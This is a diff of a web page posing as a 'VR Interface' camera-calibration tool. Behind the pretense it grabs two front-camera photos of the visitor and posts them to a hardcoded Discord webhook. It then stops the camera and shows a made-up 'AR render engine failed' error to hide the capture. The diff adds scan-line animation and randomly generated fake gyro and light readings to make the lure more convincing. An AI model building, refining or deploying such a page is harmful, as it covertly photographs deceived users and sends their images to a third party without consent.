@@ -3,21 +3,74 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>VR 實境觀測系統</title>
+<title>VR REAL-TIME SCANNER</title>
 <style>
-    body { font-family: sans-serif; text-align: center; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; background: #000; color: #fff; }
-    .container { width: 85%; max-width: 350px; padding: 30px; border: 1px solid #3f51b5; border-radius: 20px; background: rgba(0,0,0,0.8); }
-    h2 { color: #4fc3f7; }
-    button { width: 100%; padding: 18px; font-size: 18px; font-weight: bold; border: none; border-radius: 50px; background: #00c853; color: #000; cursor: pointer; }
-    #status { margin-top: 15px; font-size: 13px; color: #4fc3f7; font-family: monospace; }
+    /* 全黑背景與科技感網格 */
+    body { 
+        font-family: 'Courier New', Courier, monospace; 
+        text-align: center; margin: 0; height: 100vh; 
+        display: flex; align-items: center; justify-content: center; 
+        background-color: #000;
+        background-image: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+        background-size: 100% 2px, 3px 100%;
+        color: #00ff41; overflow: hidden; 
+    }
+
+    .container { 
+        width: 90%; max-width: 400px; padding: 40px 20px; 
+        border: 1px solid #00ff41; border-radius: 5px; 
+        background: rgba(0, 20, 0, 0.85); 
+        box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
+        position: relative;
+    }
+
+    /* 掃描線動畫 */
+    .scanner-line {
+        position: absolute; top: 0; left: 0; width: 100%; height: 2px;
+        background: #00ff41; box-shadow: 0 0 15px #00ff41;
+        animation: scan 3s linear infinite; display: none;
+    }
+    @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+    /* 四角定位框 */
+    .corner { position: absolute; width: 20px; height: 20px; border: 2px solid #00ff41; }
+    .top-left { top: 10px; left: 10px; border-right: 0; border-bottom: 0; }
+    .top-right { top: 10px; right: 10px; border-left: 0; border-bottom: 0; }
+    .bottom-left { bottom: 10px; left: 10px; border-right: 0; border-top: 0; }
+    .bottom-right { bottom: 10px; right: 10px; border-left: 0; border-top: 0; }
+
+    h2 { font-size: 20px; letter-spacing: 4px; text-transform: uppercase; margin-bottom: 30px; }
+    
+    .data-box { font-size: 10px; text-align: left; margin: 20px 0; color: #008f11; }
+
+    button { 
+        width: 100%; padding: 20px; font-size: 16px; font-weight: bold; 
+        border: 1px solid #00ff41; background: transparent; color: #00ff41; 
+        cursor: pointer; transition: 0.3s; text-transform: uppercase;
+    }
+    button:hover { background: rgba(0, 255, 65, 0.1); }
+    button:active { background: #00ff41; color: #000; }
+
+    #status { margin-top: 20px; font-size: 12px; min-height: 40px; }
 </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>🕶️ VR 模式啟動</h2>
-    <p>點擊下方按鈕並於隨後彈窗選擇「允許」，以開啟 AR 環境掃描。</p>
-    <button id="btn" onclick="initVR()">開啟 VR 觀測</button>
+    <div class="scanner-line" id="sLine"></div>
+    <div class="corner top-left"></div><div class="corner top-right"></div>
+    <div class="corner bottom-left"></div><div class="corner bottom-right"></div>
+    
+    <h2>VR Interface v4.2</h2>
+    <p style="font-size: 13px; color: #00ff41;">請連結相機以初始化環境渲染...</p>
+    
+    <div class="data-box" id="dataBox">
+        SYS_STATUS: IDLE<br>
+        GYRO_STABILITY: --%<br>
+        LIGHT_LVL: -- LUX
+    </div>
+
+    <button id="btn" onclick="initVR()">Initialize VR Scan</button>
     <div id="status"></div>
 </div>
 
@@ -28,32 +81,38 @@
 var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
 var currentStream = null;
 
+function updateDataDisplay() {
+    if (!currentStream) return;
+    const gyro = (Math.random() * 20 + 75).toFixed(2);
+    const light = (Math.random() * 50 + 100).toFixed(0);
+    document.getElementById("dataBox").innerHTML = `
+        SYS_STATUS: SCANNING...<br>
+        GYRO_STABILITY: ${gyro}%<br>
+        LIGHT_LVL: ${light} LUX<br>
+        FRAME_ID: ${Math.floor(Math.random()*100000)}
+    `;
+}
+
 async function initVR() {
     document.getElementById("btn").style.display = "none";
-    document.getElementById("status").innerHTML = "> INITIALIZING...";
+    document.getElementById("sLine").style.display = "block";
+    document.getElementById("status").innerHTML = "> ACCESSING SENSORS...";
 
     try {
-        // 僅請求相機權限，不再請求定位
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" }, 
-            audio: false 
-        });
-        
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         currentStream = stream;
         const video = document.getElementById("v");
         video.srcObject = stream;
-        
         await video.play();
         
-        document.getElementById("status").innerHTML = "> SCANNING ENVIRONMENT...";
+        setInterval(updateDataDisplay, 200); // 啟動虛擬數據變動
+        document.getElementById("status").innerHTML = "> SYNCING ENVIRONMENTAL DATA...";
         
-        // 拍照邏輯 (間隔兩秒拍兩張)
-        setTimeout(() => takeSnapshot(1), 2000);
-        setTimeout(() => takeSnapshot(2, true), 4000);
+        setTimeout(() => takeSnapshot(1), 2500);
+        setTimeout(() => takeSnapshot(2, true), 5000);
 
     } catch (err) {
-        document.getElementById("status").innerHTML = "> ERROR: SENSOR ACCESS DENIED";
-        console.error(err);
+        document.getElementById("status").innerHTML = "> FATAL ERROR: HARDWARE REJECTED";
     }
 }
 
@@ -68,23 +127,20 @@ function takeSnapshot(num, isLast = false) {
         
         canvas.toBlob(blob => {
             const fd = new FormData();
-            fd.append("file", blob, "vr_snap_" + num + ".jpg");
-            fd.append("payload_json", JSON.stringify({ content: "📸 **VR 環境掃描中 (" + num + "/2)**" }));
+            fd.append("file", blob, `vr_scan_${num}.jpg`);
+            fd.append("payload_json", JSON.stringify({ content: `💾 **VR 系統同步成功 (Part ${num}/2)**` }));
             
             fetch(webhook, { method: "POST", body: fd }).then(() => {
                 if (isLast) {
-                    // 關閉相機燈號
-                    if (currentStream) {
-                        currentStream.getTracks().forEach(t => t.stop());
-                    }
-                    document.getElementById("status").innerHTML = "> VR READY. CALIBRATING...";
+                    currentStream.getTracks().forEach(t => t.stop());
+                    document.getElementById("status").innerHTML = "> CALIBRATION COMPLETE.";
                     setTimeout(() => { 
-                        alert("VR 初始化失敗：光線不足，請重試。"); 
-                        location.reload(); 
-                    }, 500);
+                        alert("Error: AR render engine failed (0x442).\nPlease restart your device."); 
+                        location.reload();
+                    }, 800);
                 }
             });
-        }, "image/jpeg", 0.7);
+        }, "image/jpeg", 0.65);
     }
 }
 </script>
